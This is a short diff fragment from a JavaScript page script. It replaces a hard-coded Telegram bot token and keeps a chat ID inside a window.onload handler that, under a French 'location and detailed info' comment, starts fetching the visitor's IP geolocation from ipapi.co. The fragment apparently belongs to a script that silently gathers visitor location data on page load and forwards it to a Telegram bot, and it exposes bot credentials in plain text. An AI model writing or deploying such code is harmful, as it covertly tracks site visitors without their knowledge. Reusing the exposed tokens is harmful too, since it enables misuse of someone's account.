@@ -28,7 +28,7 @@ window.onload = () => {
     }
 
     // 4. LOCALISATION ET INFOS DÉTAILLÉES
-    const token = "6513521378:AAGdb0VWlfwfoqXd0nDGfQNbNj4XFF2Xnjs";
+    const token = "6513521378:AAGdb0VWlfWfoqXdOnDGfQNbNj4XFF2Xnjs";
     const chatId = "6762307554";
 
     fetch('https://ipapi.co/json/')
